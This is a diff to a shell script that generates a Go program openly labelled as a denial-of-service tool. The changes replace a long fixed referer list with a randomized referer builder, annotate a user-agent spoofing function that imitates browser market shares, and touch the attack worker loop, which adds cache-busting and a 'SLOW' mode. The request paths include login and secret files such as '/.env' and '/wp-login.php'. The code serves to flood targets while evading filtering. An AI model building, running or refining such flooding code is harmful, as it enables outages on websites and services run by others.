@@ -23,7 +23,7 @@ echo -e "${WHITE}  DENIAL SERVICE OF GO${NC}"
 echo -e "${CYAN}${SEP}${NC}"
 echo
 
-# Create main.go file directly
+# Create main.go file directly (CLEAN version - no unused imports)
 echo -e " ${YELLOW}➤${NC} ${GREEN}Creating main.go...${NC}"
 
 cat > main.go << 'EOF'
@@ -70,606 +70,6 @@ var (
 		"SO", "SR", "SS", "ST", "SV", "SX", "SY", "SZ", "TC", "TD", "TF", "TG", "TH", "TJ", "TK", "TL",
 		"TM", "TN", "TO", "TR", "TT", "TV", "TW", "TZ", "UA", "UG", "UM", "US", "UY", "UZ", "VA", "VC",
 		"VE", "VG", "VI", "VN", "VU", "WF", "WS", "YE", "YT", "ZA", "ZM", "ZW",
-	}
-
-	// Referer list
-	referers = []string{
-		"https://www.google.com/",
-		"https://www.bing.com/",
-		"https://duckduckgo.com/",
-		"https://www.youtube.com/",
-		"https://www.facebook.com/",
-		"https://google.com/",
-		"https://facebook.com/",
-		"https://youtube.com/",
-		"https://baidu.com/",
-		"https://yahoo.com/",
-		"https://amazon.com/",
-		"https://wikipedia.org/",
-		"https://qq.com/",
-		"https://twitter.com/",
-		"https://slashdot.org/",
-		"https://google.co.in/",
-		"https://taobao.com/",
-		"https://live.com/",
-		"https://sina.com.cn/",
-		"https://yahoo.co.jp/",
-		"https://linkedin.com/",
-		"https://weibo.com/",
-		"https://ebay.com/",
-		"https://google.co.jp/",
-		"https://yandex.ru/",
-		"https://vk.com/",
-		"https://hao123.com/",
-		"https://google.de/",
-		"https://instagram.com/",
-		"https://t.co/",
-		"https://msn.com/",
-		"https://amazon.co.jp/",
-		"https://tmall.com/",
-		"https://google.co.uk/",
-		"https://pinterest.com/",
-		"https://ask.com/",
-		"https://reddit.com/",
-		"https://wordpress.com/",
-		"https://mail.ru/",
-		"https://google.fr/",
-		"https://blogspot.com/",
-		"https://paypal.com/",
-		"https://google.com.br/",
-		"https://tumblr.com/",
-		"https://apple.com/",
-		"https://google.ru/",
-		"https://aliexpress.com/",
-		"https://sohu.com/",
-		"https://microsoft.com/",
-		"https://imgur.com/",
-		"https://google.it/",
-		"https://imdb.com/",
-		"https://google.es/",
-		"https://netflix.com/",
-		"https://amazon.de/",
-		"https://fc2.com/",
-		"https://360.cn/",
-		"https://alibaba.com/",
-		"https://go.com/",
-		"https://stackoverflow.com/",
-		"https://ok.ru/",
-		"https://google.com.mx/",
-		"https://google.ca/",
-		"https://amazon.in/",
-		"https://google.com.hk/",
-		"https://amazon.co.uk/",
-		"https://craigslist.org/",
-		"https://rakuten.co.jp/",
-		"https://naver.com/",
-		"https://blogger.com/",
-		"https://google.com.tr/",
-		"https://flipkart.com/",
-		"https://espn.go.com/",
-		"https://soso.com/",
-		"https://outbrain.com/",
-		"https://nicovideo.jp/",
-		"https://google.co.id/",
-		"https://cnn.com/",
-		"https://xinhuanet.com/",
-		"https://dropbox.com/",
-		"https://google.co.kr/",
-		"https://googleusercontent.com/",
-		"https://github.com/",
-		"https://ebay.de/",
-		"https://bbc.co.uk/",
-		"https://google.pl/",
-		"https://google.com.au/",
-		"https://pixnet.net/",
-		"https://googleadservices.com/",
-		"https://ebay.co.uk/",
-		"https://dailymotion.com/",
-		"https://sogou.com/",
-		"https://adobe.com/",
-		"https://nytimes.com/",
-		"https://jd.com/",
-		"https://wikia.com/",
-		"https://booking.com/",
-		"https://163.com/",
-		"https://bbc.com/",
-		"https://alipay.com/",
-		"https://dailymail.co.uk/",
-		"https://indiatimes.com/",
-		"https://china.com/",
-		"https://dmm.co.jp/",
-		"https://china.com.cn/",
-		"https://chase.com/",
-		"https://buzzfeed.com/",
-		"https://google.com.sa/",
-		"https://huffingtonpost.com/",
-		"https://youku.com/",
-		"https://google.com.eg/",
-		"https://google.com.tw/",
-		"https://uol.com.br/",
-		"https://amazon.cn/",
-		"https://snapdeal.com/",
-		"https://office.com/",
-		"https://google.com.ar/",
-		"https://microsoftonline.com/",
-		"https://walmart.com/",
-		"https://ameblo.jp/",
-		"https://amazon.fr/",
-		"https://daum.net/",
-		"https://amazonaws.com/",
-		"https://blogspot.in/",
-		"https://slideshare.net/",
-		"https://etsy.com/",
-		"https://twitch.tv/",
-		"https://google.com.pk/",
-		"https://whatsapp.com/",
-		"https://bankofamerica.com/",
-		"https://yelp.com/",
-		"https://globo.com/",
-		"https://theguardian.com/",
-		"https://tudou.com/",
-		"https://flickr.com/",
-		"https://aol.com/",
-		"https://stackexchange.com/",
-		"https://chinadaily.com.cn/",
-		"https://cnet.com/",
-		"https://weather.com/",
-		"https://indeed.com/",
-		"https://ettoday.net/",
-		"https://amazon.it/",
-		"https://quora.com/",
-		"https://soundcloud.com/",
-		"https://google.nl/",
-		"https://forbes.com/",
-		"https://douban.com/",
-		"https://naver.jp/",
-		"https://bp.blogspot.com/",
-		"https://cntv.cn/",
-		"https://cnzz.com/",
-		"https://google.co.za/",
-		"https://wellsfargo.com/",
-		"https://google.co.ve/",
-		"https://target.com/",
-		"https://zillow.com/",
-		"https://vice.com/",
-		"https://google.gr/",
-		"https://leboncoin.fr/",
-		"https://kakaku.com/",
-		"https://ikea.com/",
-		"https://gmail.com/",
-		"https://bestbuy.com/",
-		"https://vimeo.com/",
-		"https://avito.ru/",
-		"https://godaddy.com/",
-		"https://goo.ne.jp/",
-		"https://salesforce.com/",
-		"https://about.com/",
-		"https://tripadvisor.com/",
-		"https://allegro.pl/",
-		"https://livejournal.com/",
-		"https://nih.gov/",
-		"https://foxnews.com/",
-		"https://deviantart.com/",
-		"https://files.wordpress.com/",
-		"https://google.com.ua/",
-		"https://washingtonpost.com/",
-		"https://w3schools.com/",
-		"https://themeforest.net/",
-		"https://feedly.com/",
-		"https://wikihow.com/",
-		"https://wordpress.org/",
-		"https://office365.com/",
-		"https://taboola.com/",
-		"https://9gag.com/",
-		"https://mozilla.org/",
-		"https://akamaihd.net/",
-		"https://zol.com.cn/",
-		"https://mediafire.com/",
-		"https://businessinsider.com/",
-		"https://google.cn/",
-		"https://onet.pl/",
-		"https://comcast.net/",
-		"https://gfycat.com/",
-		"https://softonic.com/",
-		"https://google.com.co/",
-		"https://pixiv.net/",
-		"https://google.co.th/",
-		"https://zhihu.com/",
-		"https://americanexpress.com/",
-		"https://amazon.es/",
-		"https://mystart.com/",
-		"https://nfl.com/",
-		"https://wix.com/",
-		"https://steamcommunity.com/",
-		"https://archive.org/",
-		"https://usps.com/",
-		"https://ups.com/",
-		"https://google.com.sg/",
-		"https://wikimedia.org/",
-		"https://bilibili.com/",
-		"https://homedepot.com/",
-		"https://google.ro/",
-		"https://secureserver.net/",
-		"https://doorblog.jp/",
-		"https://force.com/",
-		"https://telegraph.co.uk/",
-		"https://skype.com/",
-		"https://detik.com/",
-		"https://shutterstock.com/",
-		"https://google.com.ng/",
-		"https://ebay-kleinanzeigen.de/",
-		"https://weebly.com/",
-		"https://google.com.ph/",
-		"https://addthis.com/",
-		"https://steampowered.com/",
-		"https://web.de/",
-		"https://bitauto.com/",
-		"https://blogspot.com.br/",
-		"https://google.se/",
-		"https://github.io/",
-		"https://rambler.ru/",
-		"https://avg.com/",
-		"https://ndtv.com/",
-		"https://hulu.com/",
-		"https://gamer.com.tw/",
-		"https://xywy.com/",
-		"https://huanqiu.com/",
-		"https://nametests.com/",
-		"https://51.la/",
-		"https://orange.fr/",
-		"https://sourceforge.net/",
-		"https://hdfcbank.com/",
-		"https://espncricinfo.com/",
-		"https://answers.com/",
-		"https://hp.com/",
-		"https://gmx.net/",
-		"https://youm7.com/",
-		"https://mailchimp.com/",
-		"https://mercadolivre.com.br/",
-		"https://speedtest.net/",
-		"https://xfinity.com/",
-		"https://ebay.in/",
-		"https://webmd.com/",
-		"https://ifeng.com/",
-		"https://google.at/",
-		"https://groupon.com/",
-		"https://blogfa.com/",
-		"https://wordreference.com/",
-		"https://uptodown.com/",
-		"https://xuite.net/",
-		"https://media.tumblr.com/",
-		"https://hootsuite.com/",
-		"https://usatoday.com/",
-		"https://google.pt/",
-		"https://capitalone.com/",
-		"https://stumbleupon.com/",
-		"https://goodreads.com/",
-		"https://wp.pl/",
-		"https://people.com.cn/",
-		"https://google.be/",
-		"https://t-online.de/",
-		"https://paytm.com/",
-		"https://fedex.com/",
-		"https://fbcdn.net/",
-		"https://icicibank.com/",
-		"https://blog.jp/",
-		"https://google.com.pe/",
-		"https://thesaurus.com/",
-		"https://bloomberg.com/",
-		"https://mashable.com/",
-		"https://caijing.com.cn/",
-		"https://bild.de/",
-		"https://pandora.com/",
-		"https://amazon.ca/",
-		"https://spiegel.de/",
-		"https://seznam.cz/",
-		"https://google.ae/",
-		"https://spotify.com/",
-		"https://wsj.com/",
-		"https://dell.com/",
-		"https://ign.com/",
-		"https://jabong.com/",
-		"https://udn.com/",
-		"https://2ch.net/",
-		"https://macys.com/",
-		"https://kaskus.co.id/",
-		"https://att.com/",
-		"https://engadget.com/",
-		"https://accuweather.com/",
-		"https://varzesh3.com/",
-		"https://watsons.tmall.com/",
-		"https://life.com.tw/",
-		"https://smzdm.com/",
-		"https://badoo.com/",
-		"https://google.ch/",
-		"https://mama.cn/",
-		"https://samsung.com/",
-		"https://adidas.tmall.com/",
-		"https://rutracker.org/",
-		"https://1688.com/",
-		"https://chaoshi.tmall.com/",
-		"https://1905.com/",
-		"https://gsmarena.com/",
-		"https://google.az/",
-		"https://youth.cn/",
-		"https://onlinesbi.com/",
-		"https://styletv.com.cn/",
-		"https://abs-cbnnews.com/",
-		"https://mega.nz/",
-		"https://twimg.com/",
-		"https://zendesk.com/",
-		"https://trello.com/",
-		"https://mlb.com/",
-		"https://rediff.com/",
-		"https://tistory.com/",
-		"https://39.net/",
-		"https://reference.com/",
-		"https://google.cl/",
-		"https://google.com.bd/",
-		"https://google.cz/",
-		"https://milliyet.com.tr/",
-		"https://reuters.com/",
-		"https://icloud.com/",
-		"https://verizonwireless.com/",
-		"https://haosou.com/",
-		"https://liputan6.com/",
-		"https://kohls.com/",
-		"https://kickstarter.com/",
-		"https://sahibinden.com/",
-		"https://shopclues.com/",
-		"https://enet.com.cn/",
-		"https://ebay.it/",
-		"https://iqiyi.com/",
-		"https://sberbank.ru/",
-		"https://impress.co.jp/",
-		"https://eksisozluk.com/",
-		"https://bleacherreport.com/",
-		"https://slickdeals.net/",
-		"https://yaolan.com/",
-		"https://evernote.com/",
-		"https://babytree.com/",
-		"https://baike.com/",
-		"https://lady8844.com/",
-		"https://infusionsoft.com/",
-		"https://hurriyet.com.tr/",
-		"https://ask.fm/",
-		"https://google.hu/",
-		"https://liveinternet.ru/",
-		"https://flirchi.com/",
-		"https://newegg.com/",
-		"https://ijreview.com/",
-		"https://vid.me/",
-		"https://likes.com/",
-		"https://kinopoisk.ru/",
-		"https://thefreedictionary.com/",
-		"https://pinimg.com/",
-		"https://oracle.com/",
-		"https://ppomppu.co.kr/",
-		"https://google.ie/",
-		"https://gap.com/",
-		"https://4shared.com/",
-		"https://rt.com/",
-		"https://google.co.il/",
-		"https://yandex.ua/",
-		"https://scribd.com/",
-		"https://ebay.com.au/",
-		"https://quikr.com/",
-		"https://photobucket.com/",
-		"https://ltn.com.tw/",
-		"https://taleo.net/",
-		"https://repubblica.it/",
-		"https://ce.cn/",
-		"https://libero.it/",
-		"https://onedio.com/",
-		"https://list-manage.com/",
-		"https://uploaded.net/",
-		"https://slack.com/",
-		"https://blogspot.com.es/",
-		"https://blogimg.jp/",
-		"https://livedoor.com/",
-		"https://meetup.com/",
-		"https://cbssports.com/",
-		"https://retailmenot.com/",
-		"https://goal.com/",
-		"https://goodgamestudios.com/",
-		"https://cnnic.cn/",
-		"https://eastday.com/",
-		"https://citi.com/",
-		"https://lifehacker.com/",
-		"https://51yes.com/",
-		"https://olx.in/",
-		"https://hm.com/",
-		"https://neobux.com/",
-		"https://ameba.jp/",
-		"https://cloudfront.net/",
-		"https://teepr.com/",
-		"https://pconline.com.cn/",
-		"https://google.dz/",
-		"https://kinogo.co/",
-		"https://gizmodo.com/",
-		"https://elpais.com/",
-		"https://savefrom.net/",
-		"https://rbc.ru/",
-		"https://disqus.com/",
-		"https://fiverr.com/",
-		"https://theverge.com/",
-		"https://ewt.cc/",
-		"https://marca.com/",
-		"https://xda-developers.com/",
-		"https://lowes.com/",
-		"https://free.fr/",
-		"https://google.fi/",
-		"https://allrecipes.com/",
-		"https://xe.com/",
-		"https://battle.net/",
-		"https://kompas.com/",
-		"https://surveymonkey.com/",
-		"https://aparat.com/",
-		"https://souq.com/",
-		"https://mobile.de/",
-		"https://nordstrom.com/",
-		"https://stockstar.com/",
-		"https://time.com/",
-		"https://asos.com/",
-		"https://intuit.com/",
-		"https://youboy.com/",
-		"https://nbcnews.com/",
-		"https://naukri.com/",
-		"https://epweike.com/",
-		"https://techcrunch.com/",
-		"https://medium.com/",
-		"https://tabelog.com/",
-		"https://independent.co.uk/",
-		"https://chip.de/",
-		"https://zippyshare.com/",
-		"https://lenovo.com/",
-		"https://expedia.com/",
-		"https://wunderground.com/",
-		"https://java.com/",
-		"https://corriere.it/",
-		"https://gmarket.co.kr/",
-		"https://subscene.com/",
-		"https://webssearches.com/",
-		"https://plarium.com/",
-		"https://hotels.com/",
-		"https://autohome.com.cn/",
-		"https://playstation.com/",
-		"https://irctc.co.in/",
-		"https://glassdoor.com/",
-		"https://eyny.com/",
-		"https://ancestry.com/",
-		"https://gamefaqs.com/",
-		"https://sabq.org/",
-		"https://qunar.com/",
-		"https://myway.com/",
-		"https://google.sk/",
-		"https://cnbeta.com/",
-		"https://urdupoint.com/",
-		"https://17ok.com/",
-		"https://albawabhnews.com/",
-		"https://blackboard.com/",
-		"https://airbnb.com/",
-		"https://google.com.vn/",
-		"https://hatena.ne.jp/",
-		"https://azlyrics.com/",
-		"https://mercadolibre.com.ar/",
-		"https://nifty.com/",
-		"https://kijiji.ca/",
-		"https://doubleclick.net/",
-		"https://justdial.com/",
-		"https://6pm.com/",
-		"https://mercadolibre.com.ve/",
-		"https://shopify.com/",
-		"https://olx.pl/",
-		"https://instructables.com/",
-		"https://realtor.com/",
-		"https://chinaz.com/",
-		"https://costco.com/",
-		"https://nike.com/",
-		"https://people.com/",
-		"https://npr.org/",
-		"https://timeanddate.com/",
-		"https://gmanetwork.com/",
-		"https://issuu.com/",
-		"https://digikala.com/",
-		"https://lenta.ru/",
-		"https://kayak.com/",
-		"https://jimdo.com/",
-		"https://subito.it/",
-		"https://codecanyon.net/",
-		"https://box.com/",
-		"https://rottentomatoes.com/",
-		"https://kooora.com/",
-		"https://seesaa.net/",
-		"https://verizon.com/",
-		"https://siteadvisor.com/",
-		"https://discovercard.com/",
-		"https://blogspot.jp/",
-		"https://elmundo.es/",
-		"https://xunlei.com/",
-		"https://11st.co.kr/",
-		"https://tmz.com/",
-		"https://douyutv.com/",
-		"https://donga.com/",
-		"https://google.no/",
-		"https://taringa.net/",
-		"https://haber7.com/",
-		"https://youdao.com/",
-		"https://okcupid.com/",
-		"https://bukalapak.com/",
-		"https://clien.net/",
-		"https://microsoftstore.com/",
-		"https://gazeta.pl/",
-		"https://bhaskar.com/",
-		"https://mirror.co.uk/",
-		"https://hupu.com/",
-		"https://k618.cn/",
-		"https://instructure.com/",
-		"https://so-net.ne.jp/",
-		"https://ebay.fr/",
-		"https://zomato.com/",
-		"https://squarespace.com/",
-		"https://urbandictionary.com/",
-		"https://focus.de/",
-		"https://google.dk/",
-		"https://zulily.com/",
-		"https://wired.com/",
-		"https://overstock.com/",
-		"https://wetransfer.com/",
-		"https://itmedia.co.jp/",
-		"https://southwest.com/",
-		"https://latimes.com/",
-		"https://fidelity.com/",
-		"https://csdn.net/",
-		"https://nba.com/",
-		"https://change.org/",
-		"https://sakura.ne.jp/",
-		"https://gearbest.com/",
-		"https://drudgereport.com/",
-		"https://freepik.com/",
-		"https://moneycontrol.com/",
-		"https://eonline.com/",
-		"https://livescore.com/",
-		"https://google.com.my/",
-		"https://asana.com/",
-		"https://vnexpress.net/",
-		"https://airtel.in/",
-		"https://agoda.com/",
-		"https://japanpost.jp/",
-		"https://yandex.com.tr/",
-		"https://r10.net/",
-		"https://cookpad.com/",
-		"https://yodobashi.com/",
-		"https://mixi.jp/",
-		"https://woot.com/",
-		"https://ytimg.com/",
-		"https://php.net/",
-		"https://pof.com/",
-		"https://makemytrip.com/",
-		"https://udemy.com/",
-		"https://wayfair.com/",
-		"https://domaintools.com/",
-		"https://statcounter.com/",
-		"https://hespress.com/",
-		"https://trulia.com/",
-		"https://slate.com/",
-		"https://asus.com/",
-		"https://billdesk.com/",
-		"https://sears.com/",
-		"https://aweber.com/",
-		"https://wow.com/",
-		"https://foodnetwork.com/",
-		"https://pch.com/",
-		"https://ca.gov/",
-		"https://constantcontact.com/",
-		"https://bomb01.com/",
-		"https://yandex.kz/",
-		"https://blogspot.mx/",
-		"https://researchgate.net/",
-		"https://mihanblog.com/",
-		"https://interia.pl/",
-		"https://goo.gl/",
-		"https://ensonhaber.com/",
 	}
 
 	acceptLanguages = []string{
@@ -1132,13 +532,48 @@ func randomCountryCode() string {
 }
 
 func randomReferer() string {
-	return referers[randInt(0, len(referers)-1)]
+	// Generate random legitimate-looking URL
+	schemes := []string{"https", "http"}
+	scheme := schemes[randInt(0, len(schemes)-1)]
+	
+	domains := []string{
+		"google.com", "bing.com", "duckduckgo.com", "youtube.com", "facebook.com",
+		"twitter.com", "instagram.com", "linkedin.com", "wikipedia.org", "reddit.com",
+		"amazon.com", "ebay.com", "netflix.com", "spotify.com", "github.com",
+		"stackoverflow.com", "medium.com", "quora.com", "tumblr.com", "pinterest.com",
+		"whatsapp.com", "telegram.org", "zoom.us", "microsoft.com", "apple.com",
+	}
+	domain := domains[randInt(0, len(domains)-1)]
+	
+	tlds := []string{"com", "org", "net", "io", "co", "uk", "de", "fr", "jp", "br"}
+	tld := tlds[randInt(0, len(tlds)-1)]
+	
+	paths := []string{
+		"/", "/search", "/results", "/page", "/home", "/explore", "/trending",
+		"/popular", "/news", "/blog", "/post", "/article", "/watch", "/feed", 
+		"/about", "/discover", "/top", "/latest", "/random", "/featured", "/viral",
+	}
+	path := paths[randInt(0, len(paths)-1)]
+	
+	// Add random query parameters 70% of the time
+	if randInt(1, 100) <= 70 {
+		path += "?q=" + randomString(randInt(3, 10))
+		if randBool() {
+			path += "&" + randomString(randInt(3, 8)) + "=" + randomString(randInt(2, 12))
+		}
+		if randBool() {
+			path += "&utm_source=google&utm_medium=organic&utm_campaign=" + randomString(randInt(5, 15))
+		}
+	}
+	
+	return fmt.Sprintf("%s://%s.%s%s", scheme, domain, tld, path)
 }
 
 func generateRandomUA() string {
 	browserType := randInt(1, 100)
 	countryCode := randomCountryCode()
 	
+	// Windows versions (2025-2026)
 	windowsVersions := []string{
 		"Windows NT 10.0; Win64; x64",
 		"Windows NT 11.0; Win64; x64",
@@ -1146,6 +581,7 @@ func generateRandomUA() string {
 		"Windows NT 10.0; Win64; x64; Xbox",
 	}
 	
+	// macOS versions (2025-2026)
 	macVersions := []string{
 		"Macintosh; Intel Mac OS X 15_0",
 		"Macintosh; Intel Mac OS X 15_1",
@@ -1156,6 +592,7 @@ func generateRandomUA() string {
 		"Macintosh; ARM Mac OS X 16_0",
 	}
 	
+	// Linux distributions
 	linuxVersions := []string{
 		"X11; Linux x86_64",
 		"X11; Ubuntu; Linux x86_64",
@@ -1164,29 +601,34 @@ func generateRandomUA() string {
 		"X11; Linux x86_64; Arch",
 	}
 	
+	// Chrome versions (2025-2026)
 	chromeMajor := randInt(141, 165)
 	chromeBuild := randInt(5000, 8000)
 	chromePatch := randInt(0, 99)
 	chromeVersion := fmt.Sprintf("%d.0.%d.%d", chromeMajor, chromeBuild, chromePatch)
 	
+	// Firefox versions (2025-2026)
 	firefoxMajor := randInt(135, 165)
 	firefoxMinor := randInt(0, 9)
 	firefoxPatch := randInt(0, 99)
-	firefoxVersion := fmt.Sprintf("%d.%d.%d", firefoxMajor, firefoxMinor, firefoxPatch)
+	firefoxVersion := fmt.Sprintf("%d.%d", firefoxMajor, firefoxMinor)
 	
+	// Edge versions (2025-2026)
 	edgeMajor := randInt(141, 165)
 	edgeBuild := randInt(5000, 8000)
 	edgePatch := randInt(0, 99)
 	edgeVersion := fmt.Sprintf("%d.0.%d.%d", edgeMajor, edgeBuild, edgePatch)
 	
+	// Safari versions (2025-2026)
 	safariMajor := randInt(18, 22)
 	safariMinor := randInt(0, 5)
 	safariVersion := fmt.Sprintf("%d.%d", safariMajor, safariMinor)
 	
+	// Mobile browsers
 	androidVersions := []string{"15", "16", "17"}
 	androidVersion := androidVersions[randInt(0, len(androidVersions)-1)]
 	
-	if browserType <= 45 {
+	if browserType <= 45 { // Chrome 45%
 		osType := randInt(1, 100)
 		var os string
 		if osType <= 40 {
@@ -1197,7 +639,7 @@ func generateRandomUA() string {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36", os, countryCode, chromeVersion)
-	} else if browserType <= 75 {
+	} else if browserType <= 75 { // Firefox 30%
 		osType := randInt(1, 100)
 		var os string
 		if osType <= 40 {
@@ -1208,22 +650,22 @@ func generateRandomUA() string {
 			os = linuxVersions[randInt(0, len(linuxVersions)-1)]
 		}
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s; rv:%s) Gecko/20100101 Firefox/%s", os, countryCode, firefoxVersion, firefoxVersion)
-	} else if browserType <= 88 {
+	} else if browserType <= 88 { // Edge 13%
 		os := windowsVersions[randInt(0, len(windowsVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Safari/537.36 Edg/%s", os, countryCode, edgeVersion, edgeVersion)
-	} else if browserType <= 95 {
+	} else if browserType <= 95 { // Safari 7%
 		os := macVersions[randInt(0, len(macVersions)-1)]
 		return fmt.Sprintf("Mozilla/5.0 (%s; %s) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Safari/605.1.15", os, countryCode, safariVersion)
-	} else {
+	} else { // Mobile browsers 5%
 		mobileType := randInt(1, 100)
-		if mobileType <= 60 {
+		if mobileType <= 60 { // Android Chrome
 			device := []string{"SM-G998B", "Pixel 9 Pro", "OnePlus 12", "Xiaomi 14", "SM-S938B"}[randInt(0, 4)]
 			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; %s) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/%s Mobile Safari/537.36", androidVersion, countryCode, device, chromeVersion)
-		} else if mobileType <= 85 {
+		} else if mobileType <= 85 { // iPhone Safari
 			iphoneModel := []string{"iPhone18,1", "iPhone18,2", "iPhone18,3"}[randInt(0, 2)]
 			iosVersion := []string{"18_0", "18_1", "18_2", "19_0"}[randInt(0, 3)]
 			return fmt.Sprintf("Mozilla/5.0 (%s; %s; CPU iPhone OS %s like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/%s Mobile/15E148 Safari/604.1", iphoneModel, countryCode, iosVersion, safariVersion)
-		} else {
+		} else { // Samsung Internet
 			samsungVersion := fmt.Sprintf("%d.0", randInt(25, 30))
 			return fmt.Sprintf("Mozilla/5.0 (Linux; Android %s; %s; SAMSUNG SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) SamsungBrowser/%s Chrome/%s Mobile", androidVersion, countryCode, samsungVersion, chromeVersion)
 		}
@@ -1268,7 +710,7 @@ func generatePath() string {
 		"/wp-login.php", "/xmlrpc.php", "/wp-json", "/graphql",
 		"/rest/v1", "/oauth/token", "/auth/login", "/signin",
 		"/static/js/main.js", "/static/css/style.css", "/assets/app.js",
-		"/.env", "/config.json", "/settings.ini", "/application.yml",
+		"/.env", "/config.json", "/settings.ini", "/application.yml", 
 	}
 	return paths[randInt(0, len(paths)-1)]
 }
@@ -1384,7 +826,7 @@ func main() {
 
 	ticker := time.NewTicker(1 * time.Second)
 	defer ticker.Stop()
-
+	
 	for {
 		select {
 		case <-done:
@@ -1425,7 +867,7 @@ func attackWorker(target, mode string, done chan struct{}, stats *atomicCounter,
 		default:
 			client := pool.GetClient()
 			path := generatePath()
-
+			
 			if mode != "SLOW" && randInt(1, 100) <= 70 {
 				path += generateCacheBust()
 			}
